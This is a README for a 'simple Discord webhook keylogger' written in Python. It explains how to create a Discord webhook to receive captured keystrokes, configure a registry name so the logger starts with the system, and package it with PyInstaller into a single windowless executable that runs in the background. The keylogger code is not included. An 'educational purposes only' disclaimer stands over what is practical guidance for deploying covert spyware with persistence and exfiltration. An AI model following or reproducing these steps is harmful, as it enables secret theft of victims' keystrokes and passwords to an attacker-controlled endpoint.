# simple-dcwebhook-keylogger
Simple Discord Webhook keylogger written clearly in under 35 lines of code. To show you how easy this is.

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

# Creating your own Discord Webhook!
Create a Discord Server or use one that already exists.<br />
Go to the `Server Settings`, then `Integrations`.<br />
Click on `Create Webhook`, name it and select desired channel.<br />
Click on `Copy Webhook URL` and paste it in code.<br />
You are good to go.<br />

# Configuration
```python
webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
registry_name = 'Simple Discord Webhook Keylogger'     # Registry name for system startup execution
```
# Making a windows executable
You can compile Python code into Windows executable (.exe) using PyInstaller:<br />
> pyinstaller -F -w simple-dcwebhook-keylogger.py<br />

-F and -w flags mean that program will be packed in one file and running in background (windowless).
